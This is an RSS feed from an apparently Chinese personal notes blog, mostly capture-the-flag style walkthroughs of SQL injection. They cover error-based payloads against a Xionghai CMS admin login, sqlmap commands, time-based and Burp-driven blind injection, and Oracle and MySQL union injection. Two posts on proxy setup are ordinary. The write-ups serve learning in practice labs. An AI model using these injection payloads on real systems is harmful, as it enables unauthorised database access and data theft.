<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>备忘录</title>
    <link>https://xxxhidexxx.github.io/</link>
    <description>Recent content on 备忘录</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>null</copyright>
    <lastBuildDate>Mon, 12 Feb 2024 00:00:00 +0000</lastBuildDate>
    
        <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>熊海 CMS 后台登录的 SQL 注入</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
        <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;p&gt;这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&lt;/p&gt;
&lt;p&gt;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&lt;/p&gt;
&lt;p&gt;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&lt;/p&gt;
&lt;h2 id=&#34;语法回顾&#34;&gt;语法回顾&lt;/h2&gt;
&lt;p&gt;我们使用 extractvalue() 和 concat() 这两个函数引起报错。&lt;/p&gt;
&lt;p&gt;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(
    0x5c,
    0x7e,
    (select value from flag_db.flag limit 0,1),
    0x7e
    )) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and updatexml(1,concat(
    0x5c,
    0x7e,
    (select value from flag_db.flag limit 0,1)，
    0x7e
),1) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat(
        (select value from flag_db.flag limit 0,1),
        0x2b,
        floor(rand(0)*2)
    )x from information_schema.tables 
    group by x)a) 
and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上述 payload 的成功效果如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-14.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-13.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-12.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;手工注入&#34;&gt;手工注入&lt;/h2&gt;
&lt;p&gt;登录页面如下。首先我们输入单引号发现报错，这说明 user 可能存在 post 注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-6.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-7.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;考虑到有报错页面但是没有回显点，我们用 extractvalue() 进行注入，旨在引起语法错误。构造如下 payload。&lt;/p&gt;
&lt;p&gt;首先爆数据库名称。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
    select schema_name from information_schema.schemata 
        limit 0,1
),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-9.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;令 limit 0,1 中的 0 遍历 0~4 可以爆出所有数据库名称后，打开 flag_db 查询表名。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
    select table_name from information_schema.tables 
        where table_schema=&#39;flag_db&#39;
),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-8.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后查询字段。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
    select column_name from information_schema.columns 
        where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39;
        limit 0,1
),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-10.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终拿到 flag=ywaq{okjzxdHdsa}。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
    select value from flag_db.flag 
        limit 0,1
),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-11.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;用-sqlmap-扫描&#34;&gt;用 sqlmap 扫描&lt;/h2&gt;
&lt;p&gt;使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;ndash;dbs 的意思是列出所有数据库名称&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-0.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-1.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-2.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;其他发现&#34;&gt;其他发现&lt;/h2&gt;
&lt;p&gt;这里 sqlmap 提示存在时间盲注。我们用子查询输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39; and (select qwe from (select(sleep(10)))qwe) -- qwe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到延迟有效。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-5.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是我们发现这里的 sleep 必须用上述语句提高优先级，如果只输入 &lt;code&gt;&#39; and sleep(10) -- qwe&lt;/code&gt; 则无效。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli4/ - null</description>
        </item>
    
    
    
        <item>
        <title>Kali Linux 网络设置</title>
        <link>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</link>
        <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/kalinetwork/ -&lt;p&gt;连不上网的时候可以用如下指令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dhclient -v
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/linux/kali_ip.png&#34; alt=&#34;kaliifconfig&#34;&gt;&lt;/p&gt;
&lt;p&gt;代理走本机的话可以用本机开 clash。&lt;/p&gt;
&lt;p&gt;创建脚本。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
# encoding: utf-8

Proxy_IP=192.168.1.1
Proxy_Port=8080

# Set System Proxy
function xyon(){
    export https_proxy=http://$Proxy_IP:$Proxy_Port
    export http_proxy=http://$Proxy_IP:$Proxy_Port
    export all_proxy=socks5://$Proxy_IP:$Proxy_Port
    echo -e &amp;quot;System Proxy is $Proxy_IP:$Proxy_Port&amp;quot;
}

# unSet System Proxy
function xyoff(){
    unset all_proxy
    unset https_proxy
    unset http_proxy
    echo -e &amp;quot;System Proxy is Disabled&amp;quot;
}

# Default Function is Set Proxy
if [ $# != 0 ]
then
    if [ $1 == &#39;off&#39; ]
    then
	    xyoff
    elif [ $1 == &#39;on&#39; ]
    then
	    xyon
    else
	    echo &amp;quot;Please Input on or off!&amp;quot;
    fi
else
    echo &amp;quot;Please input command.&amp;quot;
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;调用脚本。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x setproxy.sh

source setproxy.sh on

source setproxy.sh off&lt;/code&gt;&lt;/pre&gt;
- https://xxxhidexxx.github.io/posts/sec/kalinetwork/ - null</description>
        </item>
    
    
    
        <item>
        <title>用 Burp Suite 跑 MySQL 盲注</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli3/</link>
        <pubDate>Wed, 07 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli3/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli3/ -&lt;h2 id=&#34;提要&#34;&gt;提要&lt;/h2&gt;
&lt;p&gt;盲注就是存在注入点但是看不到回显点。这通常有两种情况，或者是输入 &lt;code&gt;?id=1&#39; and 1=2 --+&lt;/code&gt; 能看到报错页面，或者是输入 &lt;code&gt;?id=1&#39; and sleep(3) --+&lt;/code&gt; 回车能看到网页延迟刷新。这里 sleep(3) 延迟的不一定是三秒也可能是 3 的倍数，因为 sleep 可能被执行了不止一次。数据库一般都有延时函数，例如 mysql 的 sleep()，这种注入方法一般称为时间盲注。在页面没有任何明确显示的情况下，把响应时间作为一种显示，这个想法很有趣，然而，在现实场景中时间盲注成本比较高，运算量可能比较大，不是很稳定，除非一定要爆破，应该谨慎考虑这个选择。&lt;/p&gt;
&lt;p&gt;我们这里主要演示的是用 burp 脚本进行爆破。如果手工注入的话语句的 = 改成 &amp;gt; 然后使用二分法就可以了，也没什么好讲的。&lt;/p&gt;
&lt;p&gt;在做这个靶场的时候我们发现 burp 跑出来的时间盲注结果和自己手工测试的不一样。相同的测试语句，手工的结果是正确的，但是 burp 的响应时间比较抽象，还不知道原因。&lt;/p&gt;
&lt;p&gt;用 burp 跑有报错的布尔盲注倒是很顺利，如下所述。&lt;/p&gt;
&lt;h2 id=&#34;演示&#34;&gt;演示&lt;/h2&gt;
&lt;p&gt;还是用之前的靶场进行测试。首先用 &lt;code&gt;&#39; and 1=2 --+&lt;/code&gt; 找到注入点。看到页面报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-4.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开 burp 抓包后发送到 intruder，选择集束炸弹。选中要遍历的参数之后点击添加 payload。我们两个的 payload 点位分别是 ascii 和字符串位数，所以类型都选择数值，ascii 我们直接从 1 跑到 128。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-0.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击 attack 按钮之后可以看到响应包的长度有不同，比较长的就说明是正常显示的。我们把不报错的 ascii 码依次解码得到数据库名 webug。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-1.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后可以进一步爆破表名和字段名找到 flag。语句的写法例如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&amp;gt;1 --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;讲一下 sql 语法。这里的 substr 的用法是 substr(object,start,length) 所以 start 遍历 1~n，然后 length 永远写 1。这里 limit 0,1 的意思是从第 0 项开始查询 1 项，所以是第一个参数遍历 0~n，第二个参数恒为 1。&lt;/p&gt;
&lt;p&gt;后面重复劳动不是很重要懒得写了。&lt;/p&gt;
&lt;p&gt;然后我们用时间盲注跑一下看看，得到下述结果，响应时间对不上，原因未知，应该是 burp 的问题。&lt;/p&gt;
&lt;p&gt;我们的语句用手工测试的结果没有问题，语法肯定是对的。也讲一下这个语法，if(e1,e2,e3) 的意思是，如果 e1 是对的就执行 e2，否则执行 e3。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-5.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-6.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli3/ - null</description>
        </item>
    
    
    
        <item>
        <title>Oracle 联合注入</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli2/</link>
        <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli2/ -&lt;p&gt;靶场界面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-0.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们先确认一下参数 id 处存在注入点。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-1.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; order by 6 --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-2.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。&lt;/p&gt;
&lt;p&gt;先确认一下没有报错。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select null,null,null,null,null from dual --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后确认回显点的数据类型，我们只需要一个回显点就够了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,&#39;a&#39;,null,null,null from dual --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-3.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在我们使用 oracle 的自带库。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,table_name,null,null,null from user_all_tables --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-4.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们找到了 flag 的表，进一步查询字段。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,column_name,null,null,null from all_tab_columns where table_name=&#39;UNION_FLAG&#39; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-5.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此我们就找到了 flag。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,FLAG,null,null,null from UNION_FLAG --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-6.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli2/ - null</description>
        </item>
    
    
    
        <item>
        <title>MySQL 联合注入</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
        <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli1/ -&lt;p&gt;对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&lt;/p&gt;
&lt;p&gt;webug 4.0 的联合注入靶场界面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-0.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先在 id 参数之后加单引号进行尝试。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-1.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现报错说明有注入点，这里甚至直接看到了 sql 语句。我们用 order by 猜测字段数，order by 2 正常，到 3 之后出现报错，说明有两个字段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-2.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;用联合查询查找回显点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-3.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现了一个回显点。那么我们可以直接爆出所有的库名和表名了。构造如下 poc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=-1&#39; union select null，group_concat(schema_name) from information_schema.schemata --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到如下显示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-4.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-5.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-6.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-7.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此这个靶场的 flag 就拿到了。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli1/ - null</description>
        </item>
    
    
    
        <item>
        <title>和 GitHub 相关的网络代理设置</title>
        <link>https://xxxhidexxx.github.io/about/githubproxy/</link>
        <pubDate>Mon, 29 Jan 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/about/githubproxy/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/about/githubproxy/ -&lt;p&gt;我们的浏览器通过 http 代理可以正常访问 github，现在我们希望通过 ssh 远程关联 github 仓库。&lt;/p&gt;
&lt;p&gt;遇到了两个问题：1，默认的端口 22 连接超时；2，改成端口 443 依然连接超时。&lt;/p&gt;
&lt;p&gt;首先，在打开 powershell 终端的时候，设置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set http_proxy=127.0.0.1：10809
set https_proxy=127.0.0.1：10809
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;记得别打空格。这样就设置好了 power shell 的代理。&lt;/p&gt;
&lt;p&gt;其次，在 &lt;code&gt;C:/Users/someone/.ssh&lt;/code&gt; 打开 git bash 输入 &lt;code&gt;touch config&lt;/code&gt; 建立一个 config 文件，并在 config 中写入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host github.com
Hostname ssh.github.com
Port 443
User git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一步解决的是用 ssh 连接 github 走 http 代理。&lt;/p&gt;
&lt;p&gt;最后再来设置 git 的代理。终端输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --global http.proxy 127.0.0.1:10809
&lt;/code&gt;&lt;/pre&gt;
- https://xxxhidexxx.github.io/about/githubproxy/ - null</description>
        </item>
    
    
  </channel>
</rss> 